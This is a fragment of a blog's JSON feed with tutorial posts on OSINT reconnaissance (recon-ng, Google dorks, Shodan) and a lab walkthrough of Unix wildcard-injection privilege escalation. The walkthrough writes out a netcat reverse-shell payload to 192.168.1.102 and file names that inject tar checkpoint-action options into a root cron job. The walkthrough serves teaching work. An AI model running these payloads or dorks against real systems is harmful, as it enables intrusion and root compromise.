&gt;</span></code></pre>\n</div>\n</div>\n<p>We notice many subcategories under <code>recon</code>, such as <code>domains-companies</code>, <code>domains-contacts</code>, and <code>domains-hosts</code>. This naming tells us what kind of new information we will get from that transformation. For instance, <code>domains-hosts</code> means that the module will find hosts related to the provided domain.</p>\n<p>Some modules, like <code>whoxy_whois</code>, require a key, as we can tell from the <code>*</code> under the <code>K</code> column. This requirement indicates that this module is not usable unless we have a key to use the related service.</p>\n<p>Other modules have dependencies, indicated by a <code>*</code> under the <code>D</code> column. Dependencies show that third-party Python libraries might be necessary to use the related module.</p>\n<p>Let’s say that you are interested in <code>recon/domains-hosts/google_site_web</code>. To learn more about any particular module, you can use the command <code>marketplace info MODULE</code>; this is an essential command that explains what the module does. For example, <code>marketplace info google_site_web</code> provides the following description: “Harvests hosts from Google.com by using the ‘site’ search operator. Updates the ‘hosts’ table with the results.” In other words, this module will use the Google search engine and the “site” operator.</p>\n<p>We can install the module we want with the command <code>marketplace install MODULE</code>, for example, <code>marketplace install google_site_web</code>.</p>\n<h3>Working with Installed Modules</h3>\n<p>We can work with modules using:</p>\n<ul>\n<li><code>modules search</code> to get a list of all the installed modules</li>\n<li><code>modules load MODULE</code> to load a specific module to memory</li>\n</ul>\n<p>Let’s load the module that we installed earlier from the marketplace, <code>modules load viewdns_reverse_whois</code>. To <code>run</code> it, we need to set the required options.</p>\n<ul>\n<li><code>options list</code> to list the options that we can set for the loaded module.</li>\n<li><code>options set &lt;option&gt; &lt;value&gt;</code> to set the value of the option.</li>\n</ul>\n<p>In a previous step, we have installed the module <code>google_site_web</code>, so let’s load it using <code>load google_site_web</code> and run it with <code>run</code>. We have already added the domain <code>thmredteam.com</code> to the database, so when the module is run, it will read that value from the database, get new kinds of information, and add them to the database in turn. The commands and the results are shown in the terminal output below.</p>\n<div class=\"terminal-container\">\n<div class=\"terminal-content\">\n<div class=\"terminal-top\">Pentester Terminal</div>\n<pre class=\"terminal-code language-shell-session\" tabindex=\"0\"><code class=\" language-shell-session\"><span class=\"token command\"><span class=\"token info punctuation\"><span class=\"token user\">sak@parrot</span></span><span class=\"token shell-symbol important\">$</span> <span class=\"token bash language-bash\">recon-ng -w example</span></span>\n<span class=\"token output\">[...]\n[recon-ng][example] &gt; load google_site_web\n[recon-ng][example][google_site_web] &gt; run\n\n--------------\nEXAMPLE.COM\n--------------\n[*] Searching Google for: site:example.com\n[*] Country: None\n[*] Host: cafe.example.com\n[*] Ip_Address: None\n[*] Latitude: None\n[*] Longitude: None\n[*] Notes: None\n[*] Region: None\n[*] --------------------------------------------------\n[*] Country: None\n[*] Host: clinic.example.com\n[*] Ip_Address: None\n[*] Latitude: None\n[*] Longitude: None\n[*] Notes: None\n[*] Region: None\n[*] --------------------------------------------------\n[...]\n[*] 2 total (2 new) hosts found.\n[recon-ng][example][google_site_web] &gt;</span></code></pre>\n</div>\n</div>\n<p>This module has queried Google and discovered two hosts, <code>cafe.example.com</code> and <code>clinic.example.com</code>. It is possible that by the time you run these steps, new hosts will also appear.</p>\n<h3>Keys</h3>\n<p>Some modules cannot be used without a key for the respective service API. <code>K</code> indicates that you need to provide the relevant service key to use the module in question.</p>\n<ul>\n<li><code>keys list</code> lists the keys</li>\n<li><code>keys add KEY_NAME KEY_VALUE</code> adds a key</li>\n<li><code>keys remove KEY_NAME</code> removes a key</li>\n</ul>\n<p>Once you have the set of modules installed, you can proceed to load and run them.</p>\n<ul>\n<li><code>modules load MODULE</code> loads an installed module</li>\n<li><code>CTRL + C</code> unloads the module.</li>\n<li><code>info</code> to review the loaded module’s info.</li>\n<li><code>options list</code> lists available options for the chosen module.</li>\n<li><code>options set NAME VALUE</code></li>\n<li><code>run</code> to execute the loaded module.</li>\n</ul>\n<p>Use <code>recon-ng</code> to repeat the steps carried out against <code>example</code><code>.com</code></p>\n</div>\n</div>\n</div>\n</div>",
            "image": "https://sakibulalikhan.github.io/blog/media/posts/9/recon-ng.png",
            "author": {
                "name": "Sakibul Ali Khan"
            },
            "tags": [
                   "Reconnaissance",
                   "Pentesting",
                   "OSINT",
                   "Cyber security"
            ],
            "date_published": "2022-01-12T13:30:19+06:00",
            "date_modified": "2022-01-12T21:19:49+06:00"
        },
        {
            "id": "https://sakibulalikhan.github.io/blog/advanced-searching-for-osint.html",
            "url": "https://sakibulalikhan.github.io/blog/advanced-searching-for-osint.html",
            "title": " Advanced Searching For OSINT",
            "summary": " Advanced Searching Being able to use a search engine efficiently is a crucial skill. The following table shows some popular search modifiers that&hellip;",
            "content_html": "<div class=\"card-header task-header\" data-toggle=\"collapse\" aria-expanded=\"true\"><a class=\"card-link\"> Advanced Searching<i class=\"fas fa-chevron-down\"></i></a></div>\n<div id=\"collapse4\" class=\"collapse show\" data-parent=\"#taskContent\">\n<div class=\"card-body task-incomplete\">\n<div class=\"room-task-desc\">\n<div class=\"room-task-desc-data\">\n<p>Being able to use a search engine efficiently is a crucial skill. The following table shows some popular search modifiers that work with many popular search engines.</p>\n<table class=\"table table-bordered\">\n<thead>\n<tr>\n<th>Symbol / Syntax</th>\n<th>Function</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>\"search phrase\"</code></td>\n<td>Find results with exact search phrase</td>\n</tr>\n<tr>\n<td><code>OSINT filetype:pdf</code></td>\n<td>Find files of type <code>PDF</code> related to a certain term.</td>\n</tr>\n<tr>\n<td><code>salary site:blog.example.com</code></td>\n<td>Limit search results to a specific site.</td>\n</tr>\n<tr>\n<td><code>pentest -site:example.com</code></td>\n<td>Exclude a specific site from results</td>\n</tr>\n<tr>\n<td><code>walkthrough intitle:example</code></td>\n<td>Find pages with a specific term in the page title.</td>\n</tr>\n<tr>\n<td><code>challenge inurl:example</code></td>\n<td>Find pages with a specific term in the page URL.</td>\n</tr>\n</tbody>\n</table>\n<p>Note: In addition to <code>pdf</code>, other filetypes to consider are: <code>doc</code>, <code>docx</code>, <code>ppt</code>, <code>pptx</code>, <code>xls</code> and <code>xlsx</code>.</p>\n<p>Each search engine might have a slightly varied set of rules and syntax. To learn about the specific syntax for the different search engines, you will need to visit their respective help pages. Some search engines, such as Google, provide a web interface for advanced searches: <a href=\"https://www.google.com/advanced_search\">Google Advanced Search</a>. Other times, it is best to learn the syntax by heart, such as <a href=\"https://support.google.com/websearch/answer/2466433\">Google Refine Web Searches</a>, <a href=\"https://help.duckduckgo.com/duckduckgo-help-pages/results/syntax/\">DuckDuckGo Search Syntax</a>, and <a href=\"https://help.bing.microsoft.com/apex/index/18/en-US/10002\">Bing Advanced Search Options</a>.</p>\n<p>Search engines crawl the world wide web day and night to index new web pages and files. Sometimes this can lead to indexing confidential information. Examples of confidential information include:</p>\n<ul>\n<li>Documents for internal company use</li>\n<li>Confidential spreadsheets with usernames, email addresses, and even passwords</li>\n<li>Files containing usernames</li>\n<li>Sensitive directories</li>\n<li>Service version number (some of which might be vulnerable and unpatched)</li>\n<li>Error messages</li>\n</ul>\n<p>Combining advanced Google searches with specific terms, documents containing sensitive information or vulnerable web servers can be found. Websites such as <a href=\"https://www.exploit-db.com/google-hacking-database\">Google Hacking Database</a> (GHDB) collect such search terms and are publicly available. Let's take a look at some of the GHDB queries to see if our client has any confidential information exposed via search engines. GHDB contains queries under the following categories:</p>\n<ul>\n<li><strong>Footholds</strong><br>Consider <a href=\"https://www.exploit-db.com/ghdb/6364\">GHDB-ID: 6364</a> as it uses the query <code>intitle:\"index of\" \"nginx.log\"</code> to discover Nginx logs and might reveal server misconfigurations that can be exploited.</li>\n<li><strong>Files Containing Usernames</strong><br>For example, <a href=\"https://www.exploit-db.com/ghdb/7047\">GHDB-ID: 7047</a> uses the search term <code>intitle:\"index of\" \"contacts.txt\"</code> to discover files that leak juicy information.</li>\n<li><strong>Sensitive Directories</strong><br>For example, consider <a href=\"https://www.exploit-db.com/ghdb/6768\">GHDB-ID: 6768</a>, which uses the search term <code>inurl:/certs/server.key</code> to find out if a private RSA key is exposed.</li>\n<li><strong>Web Server Detection</strong><br>Consider <a href=\"https://www.exploit-db.com/ghdb/6876\">GHDB-ID: 6876</a>, which detects GlassFish Server information using the query <code>intitle:\"GlassFish Server - Server Running\"</code>.</li>\n<li><strong>Vulnerable Files</strong><br>For example, we can try to locate <a class=\"YcGIg7um glossary-term\" onclick=\"initPopOver('PHP', 'YcGIg7um')\">PHP</a> files using the query <code>intitle:\"index of\" \"*.php\"</code>, as provided by <a href=\"https://www.exploit-db.com/ghdb/7786\">GHDB-ID: 7786</a>.</li>\n<li><strong>Vulnerable Servers</strong><br>For instance, to discover SolarWinds Orion web consoles, <a href=\"https://www.exploit-db.com/ghdb/6728\">GHDB-ID: 6728</a> uses the query <code>intext:\"user name\" intext:\"orion core\" -solarwinds.com</code>.</li>\n<li><strong>Error Messages</strong><br>Plenty of useful information can be extracted from error messages. One example is <a href=\"https://www.exploit-db.com/ghdb/5963\">GHDB-ID: 5963</a>, which uses the query <code>intitle:\"index of\" errors.log</code> to find log files related to errors.</li>\n</ul>\n<p>You might need to adapt these Google queries to fit your needs as the queries will return results from all web servers that fit the criteria and were indexed. To avoid legal issues, it is best to refrain from accessing any files outside the scope of your legal agreement.</p>\n<p>We recommend you join the <a href=\"https://tryhackme.com/room/googledorking\">Google Dorking</a> room for more in-depth information.</p>\n<p>Now we'll explore two additional sources that can provide valuable information without interacting with our target:</p>\n<ul>\n<li>Social Media</li>\n<li>Job ads</li>\n</ul>\n<p><img loading=\"lazy\" src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/30745e7e6b4d48c0f2a7774fd79a908d.jpg\" data-is-external-image=\"true\" ></p>\n<h3>Social Media</h3>\n<p> </p>\n<p>Social media websites have become very popular for not only personal use but also for corporate use. Some social media platforms can reveal tons of information about the target. This is especially true as many users tend to overshare details about themselves and their work. To name a few, it's worthwhile checking the following:</p>\n<ul>\n<li>LinkedIn</li>\n<li>Twitter</li>\n<li>Facebook</li>\n<li>Instagram</li>\n</ul>\n<p>Social media websites make it easy to collect the names of a given company's employees; moreover, in certain instances, you might learn specific pieces of information that can reveal answers to password recovery questions or gain ideas to include in a targeted wordlist. Posts from technical staff might reveal details about a company’s systems and vendors. For example, a network engineer who was recently issued Juniper certifications may allude to Juniper networking infrastructure being used in their employer’s environment.</p>\n<p><img loading=\"lazy\" src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/f24355586bbc8c897b6af23cca84f60e.jpg\" data-is-external-image=\"true\" ></p>\n<h3>Job Ads</h3>\n<p> </p>\n<p>Job advertisements can also tell you a lot about a company. In addition to revealing names and email addresses, job posts for technical positions could give insight into the target company’s systems and infrastructure. The popular job posts might vary from one country to another. Make sure to check job listing sites in the countries where your client would post their ads. Moreover, it is always worth checking their website for any job opening and seeing if this can leak any interesting information.</p>\n<p>Note that the <a href=\"https://archive.org/web/\">Wayback Machine</a> can be helpful to retrieve previous versions of a job opening page on your client’s site.</p>\n</div>\n</div>\n</div>\n</div>",
            "image": "https://sakibulalikhan.github.io/blog/media/posts/8/Advanced-Searching.jpg",
            "author": {
                "name": "Sakibul Ali Khan"
            },
            "tags": [
                   "Search Engines",
                   "Pentesting",
                   "OSINT",
                   "Cyber security"
            ],
            "date_published": "2022-01-12T13:19:23+06:00",
            "date_modified": "2022-01-12T13:30:49+06:00"
        },
        {
            "id": "https://sakibulalikhan.github.io/blog/specialized-search-engines-for-osint.html",
            "url": "https://sakibulalikhan.github.io/blog/specialized-search-engines-for-osint.html",
            "title": " Specialized Search Engines For OSINT",
            "summary": " Specialized Search Engines WHOIS and DNS Related Beyond the standard WHOIS and DNS query tools that we covered in Task 3, there are third parties that offer&hellip;",
            "content_html": "<div class=\"card-header task-header\" data-toggle=\"collapse\" aria-expanded=\"true\"><a class=\"card-link\"> Specialized Search Engines<i class=\"fas fa-chevron-down\"></i></a></div>\n<div id=\"collapse5\" class=\"collapse show\" data-parent=\"#taskContent\">\n<div class=\"card-body task-incomplete\">\n<div class=\"room-task-desc\">\n<div class=\"room-task-desc-data\">\n<h3>WHOIS and <a class=\"TvwV9Bew glossary-term\" onclick=\"initPopOver('DNS', 'TvwV9Bew')\">DNS</a> Related</h3>\n<p>Beyond the standard WHOIS and <a class=\"lupUHLLA glossary-term\" onclick=\"initPopOver('DNS', 'lupUHLLA')\">DNS</a> query tools that we covered in Task 3, there are third parties that offer paid services for historical WHOIS data. One example is WHOIS history, which provides a history of WHOIS data and can come in handy if the domain registrant didn’t use WHOIS privacy when they registered the domain.</p>\n<p>There are a handful of websites that offer advanced <a class=\"6NmwiCZE glossary-term\" onclick=\"initPopOver('DNS', '6NmwiCZE')\">DNS</a> services that are free to use. Some of these websites offer rich functionality and could have a complete room dedicated to exploring one domain. For now, we'll focus on key DNS related aspects. We will consider the following:</p>\n<ul>\n<li><a href=\"https://viewdns.info/\">VidewDNS.info</a></li>\n<li><a href=\"https://threatintelligenceplatform.com/\">Threat Intelligence Platform</a></li>\n</ul>\n<h3>ViewDNS.info</h3>\n<p><a href=\"https://viewdns.info/\">VidewDNS.info</a> offers <em>Reverse IP Lookup</em>. Initially, each web server would use one or more IP addresses; however, today, it is common to come across shared hosting servers. With shared hosting, one IP address is shared among many different web servers with different domain names. With reverse IP lookup, starting from a domain name or an IP address, you can find the other domain names using a specific IP address(es).</p>\n<p>In the figure below, we used reverse IP lookup to find other servers sharing the same IP addresses used by <code>cafe.example.com</code>. Therefore, it is important to note that knowing the IP address does not necessarily lead to a single website.</p>\n<p><img loading=\"lazy\" src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/a6a57e946b742bf9439430c1669382a5.png\" data-is-external-image=\"true\" ></p>\n<h3>Threat Intelligence Platform</h3>\n<p><a href=\"https://threatintelligenceplatform.com/\">Threat Intelligence Platform</a> requires you to provide a domain name or an IP address, and it will launch a series of tests from malware checks to WHOIS and <a class=\"ljEB3BnD glossary-term\" onclick=\"initPopOver('DNS', 'ljEB3BnD')\">DNS</a> queries. The WHOIS and DNS results are similar to the results we would get using <code>whois</code> and <code>dig</code>, but Threat Intelligence Platform presents them in a more readable and visually appealing way. There is extra information that we get with our report. For instance, after we look up <code>example</code><code class=\" language-shell-session\"></code><code>.com</code>, we see that Name Server (NS) records were resolved to their respective IPv4 and IPv6 addresses, as shown in the figure below.</p>\n<p><img loading=\"lazy\" src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/8ba0fec5aad89cfb7c3d242ed92c9da4.png\" data-is-external-image=\"true\" ></p>\n<p>On the other hand, when we searched for <code>cafe.<code class=\" language-shell-session\"><span class=\"token output\">example</span></code>.com</code>, we could also get a list of other domains on the same IP address. The result we see in the figure below is similar to the results we obtained using <a href=\"https://viewdns.info/\">VidewDNS.info</a>.</p>\n<p><img loading=\"lazy\" src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/c920bcf224185c47c4ba54b300079e48.png\" data-is-external-image=\"true\" ></p>\n<h3>Specialized Search Engines</h3>\n<h4>Censys</h4>\n<p><a href=\"https://search.censys.io/\">Censys Search</a> can provide a lot of information about IP addresses and domains. In this example, we look up one of the IP addresses that <code>cafe.example.com</code> resolves to. We can easily infer that the IP address we looked up belongs to Cloudflare. We can see information related to ports 80 and 443, among others; however, it's clear that this IP address is used to server websites other than <code>cafe.example.com</code>. In other words, this IP address belongs to a company other than our client, <a href=\"https://cafe.thmredteam.com/\">Organic Cafe</a>. It's critical to make this distinction so that we don’t probe systems outside the scope of our contract.</p>\n<p><img loading=\"lazy\" src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/efc8f98cc9e721707d4bad477340e120.png\" data-is-external-image=\"true\" ></p>\n<h4>Shodan</h4>\n<p>You might remember using <a href=\"https://www.shodan.io/\">Shodan</a> in the <a href=\"https://tryhackme.com/room/passiverecon\">Passive Reconnaissance</a> room. In this section, we will demonstrate how to use Shodan from the command line.</p>\n<p>To use Shodan from the command-line properly, you need to create an account with <a href=\"https://www.shodan.io/\">Shodan</a>, then configure <code>shodan</code> to use your API key using the command, <code>shodan init API_KEY</code>.</p>\n<p>You can use different filters depending on the <a href=\"https://account.shodan.io/billing\">type of your Shodan account</a>. To learn more about what you can do with <code>shodan</code>, we suggest that you check out <a href=\"https://cli.shodan.io/\">Shodan CLI</a>. Let’s demonstrate a simple example of looking up information about one of the IP addresses we got from <code>nslookup cafe.example.com</code>. Using <code>shodan host IP_ADDRESS</code>, we can get the geographical location of the IP address and the open ports, as shown below.</p>\n<div class=\"terminal-container\">\n<div class=\"terminal-content\">\n<div class=\"terminal-top\">Pentester Terminal</div>\n<pre class=\"terminal-code language-shell-session\" tabindex=\"0\"><code class=\" language-shell-session\"><span class=\"token command\"><span class=\"token info punctuation\"><span class=\"token user\">sak@parrot</span></span><span class=\"token shell-symbol important\">$</span> <span class=\"token bash language-bash\">shodan <span class=\"token function\">host</span> <span class=\"token number\">172.67</span>.212.249</span></span>\n\n<span class=\"token output\">172.67.212.249\nCity:                    San Francisco\nCountry:                 United States\nOrganisation:            Cloudflare, Inc.\nUpdated:                 2021-11-22T05:55:54.787113\nNumber of open ports:    5\n\nPorts:\n     80/tcp  \n    443/tcp  \n\t|-- SSL Versions: -SSLv2, -SSLv3, -TLSv1, -TLSv1.1, TLSv1.2, TLSv1.3\n   2086/tcp  \n   2087/tcp  \n   8080/tcp </span></code></pre>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>",
            "image": "https://sakibulalikhan.github.io/blog/media/posts/7/Red-Team-Recon.png",
            "author": {
                "name": "Sakibul Ali Khan"
            },
            "tags": [
                   "Search Engines",
                   "Pentesting",
                   "OSINT",
                   "Cyber security"
            ],
            "date_published": "2022-01-12T13:13:54+06:00",
            "date_modified": "2022-01-12T21:18:59+06:00"
        },
        {
            "id": "https://sakibulalikhan.github.io/blog/exploiting-wildcard-for-privilege-escalation.html",
            "url": "https://sakibulalikhan.github.io/blog/exploiting-wildcard-for-privilege-escalation.html",
            "title": "Exploiting Wildcard for Privilege Escalation",
            "summary": "Exploiting Wildcard for Privilege Escalation In this article, we will cover “Wildcard Injection” an interesting old-school UNIX hacking technique, which is still a&hellip;",
            "content_html": "<h1 class=\"post-title entry-title\">Exploiting Wildcard for Privilege Escalation</h1>\n<div class=\"post-date\"><figure class=\"post__image\"><img loading=\"lazy\"  src=\"https://sakibulalikhan.github.io/blog/media/posts/6/prev.jpeg\" sizes=\"(max-width: 48em) 100vw, 768px\" srcset=\"https://sakibulalikhan.github.io/blog/media/posts/6/responsive/prev-xs.jpeg 300w ,https://sakibulalikhan.github.io/blog/media/posts/6/responsive/prev-sm.jpeg 480w ,https://sakibulalikhan.github.io/blog/media/posts/6/responsive/prev-md.jpeg 768w ,https://sakibulalikhan.github.io/blog/media/posts/6/responsive/prev-lg.jpeg 1024w ,https://sakibulalikhan.github.io/blog/media/posts/6/responsive/prev-xl.jpeg 1360w ,https://sakibulalikhan.github.io/blog/media/posts/6/responsive/prev-2xl.jpeg 1600w\"  alt=\"Wildcard for Privilege Escalation\" width=\"474\" height=\"266\"></figure></div>\n<div class=\"content post-excerpt entry-content clearfix\">\n<p>In this article, we will cover “Wildcard Injection” an interesting old-school UNIX hacking technique, which is still a successful approach for Post exploitation and even many security-related folks haven’t heard of it. Here you will get surprised after perceiving some UNIX tools like ‘tar’ or ‘chown’ can lead to full system compromise.</p>\n<h3><strong>Table of content</strong></h3>\n<ul>\n<li>Introduction</li>\n<li>Wildcard</li>\n<li>Wildcard wildness example 1</li>\n<li>File hijacking example 2</li>\n<li>Post Exploitation via tar (Phase I)</li>\n<li>Tar Wildcard Injection (1st method)</li>\n<li>Post Exploitation via tar (Phase II)</li>\n<li>Tar Wildcard Injection (1st method)</li>\n<li>Tar Wildcard Injection (2nd method)</li>\n<li>Tar Wildcard Injection (3rd method)</li>\n</ul>\n<p><strong>Let’s Start!!!</strong></p>\n<h3><strong>Wildcard</strong></h3>\n<p>The wildcard is a character or set of characters that can be used as a replacement for some range/class of characters. Wildcards are interpreted by the shell before any other action is taken.</p>\n<p><strong>Some Wildcards character:</strong></p>\n<p><strong>*</strong>     An asterisk matches any number of character in a filename, including none.</p>\n<p><strong> ?</strong>     The question mark matches any single character.</p>\n<p><strong>[ ]</strong>   Brackets enclose a set of characters, any one of which may match a single character at that position.</p>\n<p> <strong>–  </strong>   A hyphen used within [ ] denotes a range of characters.</p>\n<p><strong>~</strong>     A tilde at the beginning of a word expands to the name of your home directory. Append another user’s login name to the character, it refers to that user’s home directory.</p>\n<p><strong>1<sup>st</sup> Example</strong></p>\n<p>You might be aware of wildcard symbol and their traditional usage but here we are presenting wildcard wildness and for this, I would like to draw your attention to the below steps.</p>\n<pre class=\"lang:default decode:true\">cd /Desktop\nmkdir wild\ncd wild\necho \"Hello Friends\" &gt; file1\necho \"This is Wildcard Injection\" &gt; file2\necho \"take help\" &gt; --help</pre>\n<p>So as you can observe, here we have made a new directory “wild” on the desktop then with help of the echo command we have created 3 files and written 1 line in each file.</p>\n<figure class=\"jetpack-lazy-image jetpack-lazy-image--handled\"><img loading=\"lazy\"  src=\"https://i0.wp.com/4.bp.blogspot.com/-aNOs6VHwEW4/Wy4yZSdnuyI/AAAAAAAAXek/4gsiqBUoScAe1vqzQ2i5PWd_2hUFfrfVACEwYBhgL/s1600/1.1.png?w=640\" data-is-external-image=\"true\"  loading=\"eager\" data-recalc-dims=\"1\" data-lazy-loaded=\"1\"></figure>\n<p>Afterwards, with help of the cat command, we try to open all the above 3 files as shown:</p>\n<pre class=\"lang:default decode:true\">cat file1\ncat file 2\ncat --help</pre>\n<p>However, the first two files opened normally and show the same information as written above. But the cat command failed to read information written inside –help file. Instead of showing “take help” while opening –help file it calls its own –help options from its own libraries &amp; such type of trick is called <strong>Wildcard wildness</strong>.</p>\n<figure class=\"jetpack-lazy-image jetpack-lazy-image--handled\"><img loading=\"lazy\"  src=\"https://i0.wp.com/1.bp.blogspot.com/-aEBHdou9cpU/Wy4yZvUHwVI/AAAAAAAAXgQ/sb4tiFcxRRM6RnAPxLPZtpMrCA1bnFX7QCEwYBhgL/s1600/1.2.png?w=640\" data-is-external-image=\"true\"  loading=\"eager\" data-recalc-dims=\"1\" data-lazy-loaded=\"1\"></figure>\n<h3><strong>File owner hijacking via Chown</strong></h3>\n<p>Similarly again we try to do something roguish with help of <strong>chown</strong> command. As we know it is an abbreviation of change owner, which is used on Unix-like systems to modify the ownership of file system files, directories and it may only be changed by a super-user. Let say we have three users in our system.</p>\n<p>Super-user (<strong>root</strong>) – perform an admin-level task such as run <strong>chown</strong> command.</p>\n<p>Non-root-user1 (<strong>raj</strong>) – perform ordinary jobs such as create file</p>\n<p>Non-root-user2 (<strong>sak</strong>) – perform ordinary jobs such as create file</p>\n<p>Mischief-user (<strong>Ignite</strong>) – perform a notorious task such as the <strong>Chown</strong> file reference trick that can lead to file owner hijacking.</p>\n<p>In the following image, you can observe all the PHP file is owned by user: raj. Now when the user: ignite found all PHP file is own be user raj then he induces two PHP file himself in the same directory and uses file reference trick for file owner hijacking by executing below commands.</p>\n<pre class=\"lang:default decode:true\">ls -al\necho \"\" &gt; my.php\necho &gt; --reference=my.php</pre>\n<figure class=\"jetpack-lazy-image jetpack-lazy-image--handled\"><img loading=\"lazy\"  src=\"https://i1.wp.com/1.bp.blogspot.com/-9LX33vg4GDQ/Wy4yZkCeO6I/AAAAAAAAXgM/eI3TQ7LvuyQUSVsrVrmfwcNqn3Qqqok1wCEwYBhgL/s1600/1.3.png?w=640\" data-is-external-image=\"true\"  loading=\"eager\" data-recalc-dims=\"1\" data-lazy-loaded=\"1\"></figure>\n<p>As you can notice, mostly file is owned by user: raj and the last two files are owned by user: ignite and when the super-user will be supposed to change ownership of all file having PHP extension with help of wildcard, then all files will indirectly come under the ownership of user: ignite.</p>\n<p>As you can observe when root user run chown command to give ownership to all the PHP files to the user: aarti, an error occurred and as result, the all PHP file get seized by user: ignite automatically.</p>\n<pre class=\"lang:default decode:true\">chown -R aarti:aarti *.php\nls -al</pre>\n<p><strong>Conceptual Information:</strong></p>\n<p>If you have ever explored tar to read its optional switches then you will find the following option.</p>\n<p><strong>–reference=RFILE</strong> (use RFILE’s owner and group rather than specifying OWNER: GROUP values)</p>\n<p>In our case user: ignite executed the following commands:</p>\n<pre class=\"lang:default decode:true\">echo \"\" &gt; my.php\necho &gt; --reference=my.php</pre>\n<p>Then root user takes the help of the wildcard character for changing ownership. Thing is that the wildcard character used in ‘chown’ command line took the subjective ‘–reference=.my.php’ file and passed it to the chown command at the command line as an option.</p>\n<figure class=\"jetpack-lazy-image jetpack-lazy-image--handled\"><img loading=\"lazy\"  src=\"https://i1.wp.com/2.bp.blogspot.com/-b9cA7Ai6bxg/Wy4yaFRWkKI/AAAAAAAAXgY/V_Z8aGXCbXcTHruYX0oIsiWDlaQ_SEl4wCEwYBhgL/s1600/1.4.png?w=640\" data-is-external-image=\"true\"  loading=\"eager\" data-recalc-dims=\"1\" data-lazy-loaded=\"1\"></figure>\n<h3><strong>Post Exploitation via tar (Phase I)</strong></h3>\n<p><strong>Lab-Setup</strong></p>\n<p>Likewise again we extend the wildness of wildcard character to the ultimate level and it was like a dynamic explosion in terms of system hacking.</p>\n<p>Tar is a very common UNIX program for creating and extracting archives. And with help of it, we are going to take a compress backup of any directory. For example, make a new directory and give ALL permission to it and then create some files.</p>\n<pre class=\"lang:default decode:true\">mkdir html\nchmod 777 html\ncd html\ntouch index.html\ntouch raj\ntouch file.txt</pre>\n<figure class=\"jetpack-lazy-image jetpack-lazy-image--handled\"><img loading=\"lazy\"  src=\"https://i0.wp.com/1.bp.blogspot.com/-REcPJzmUnrw/Wy4yaJOjmwI/AAAAAAAAXf8/9kCdJ-Gw8rQ7RLVSMTbuYeXCp7MXWFZ7wCEwYBhgL/s1600/1.png?w=640\" data-is-external-image=\"true\"  loading=\"eager\" data-recalc-dims=\"1\" data-lazy-loaded=\"1\"></figure>\n<p>Now schedule a task with help of crontab to run tar archival program for taking backup of /html from inside /var/backups in every 1 minute.</p>\n<pre class=\"lang:default decode:true\">nano /etc/crontab\n*/1 *   * * *   root tar -zcf /var/backups/html.tgz /var/www/html/*</pre>\n<figure class=\"jetpack-lazy-image jetpack-lazy-image--handled\"><img loading=\"lazy\"  src=\"https://i1.wp.com/1.bp.blogspot.com/-AyxeBLgnxPc/Wy4ydPEeVgI/AAAAAAAAXgg/-vhBlyxEK5ESW2zZXnGjN1I8OIDLPcYaACEwYBhgL/s1600/2.png?w=640\" data-is-external-image=\"true\"  loading=\"eager\" data-recalc-dims=\"1\" data-lazy-loaded=\"1\"></figure>\n<p>Let’s verify the schedule is working or not by executing the following command.</p>\n<pre class=\"lang:default decode:true \">cd /var/backup\nls</pre>\n<figure class=\"jetpack-lazy-image jetpack-lazy-image--handled\"><img loading=\"lazy\"  src=\"https://i0.wp.com/2.bp.blogspot.com/-Y6KPox2OEXA/Wy4ydSFKCfI/AAAAAAAAXgE/u34EpcYKHMIaIRSrT2DpKhnjGqQm50kYgCEwYBhgL/s1600/3.png?w=640\" data-is-external-image=\"true\"  loading=\"eager\" data-recalc-dims=\"1\" data-lazy-loaded=\"1\"></figure>\n<h3><strong>Tar Wildcard Injection (1<sup>st</sup> method)</strong></h3>\n<p><strong>Privilege Escalation</strong></p>\n<p>Start your attacking machine and first compromise the target system and then move to the privilege escalation stage. Suppose I successfully login into the victim’s machine through ssh and access the non-root user terminal. Then open crontab to view if any job is scheduled.</p>\n<pre class=\"lang:default decode:true\">cat /etc/crontab</pre>\n<p>Here we notice the target has scheduled a tar archival program for every 1 minute and we know that cron job runs as root. Let’s try to exploit.</p>\n<figure class=\"jetpack-lazy-image jetpack-lazy-image--handled\"><img loading=\"lazy\"  src=\"https://i2.wp.com/2.bp.blogspot.com/-ALzdcI0seL4/Wy4ydtsDN7I/AAAAAAAAXgU/ibH2NahxT-wyhNFtVbA73eIT1rCEjtAPQCEwYBhgL/s1600/4.png?w=640\" data-is-external-image=\"true\"  loading=\"eager\" data-recalc-dims=\"1\" data-lazy-loaded=\"1\"></figure>\n<p>On a new terminal generate netcat reverse shell malicious code for achieving netcat reverse connection by using msfvenom and enter the following command for that.</p>\n<pre class=\"lang:default decode:true \">msfvenom -p cmd/unix/reverse_netcat lhost=192.168.1.102 lport=8888 R</pre>\n<p>Copy the generated payload and paste it inside the victim’s shell as described below.</p>\n<p><strong>nc -lvp 8888</strong></p>\n<figure class=\"jetpack-lazy-image jetpack-lazy-image--handled\"><img loading=\"lazy\"  src=\"https://i0.wp.com/3.bp.blogspot.com/-_v2Z6h1mZtw/Wy4ydjM3BfI/AAAAAAAAXgQ/7tIEuYRSQPIbQPjv1FZCISd8-95eTRAqQCEwYBhgL/s1600/5.png?w=640\" data-is-external-image=\"true\"  loading=\"eager\" data-recalc-dims=\"1\" data-lazy-loaded=\"1\"></figure>\n<p>Now paste the above-copied payload as described below and ran the following commands inside the victim’s tty shell.</p>\n<pre class=\"lang:default decode:true\">echo \"mkfifo /tmp/lhennp; nc 192.168.1.102 8888 0&lt;/tmp/lhennp | /bin/sh &gt;/tmp/lhennp 2&gt;&amp;1; rm /tmp/lhennp\" &gt; shell.sh\necho \"\" &gt; \"--checkpoint-action=exec=sh shell.sh\"\necho \"\" &gt; --checkpoint=1\ntar cf archive.tar *</pre>\n<figure class=\"jetpack-lazy-image jetpack-lazy-image--handled\"><img loading=\"lazy\"  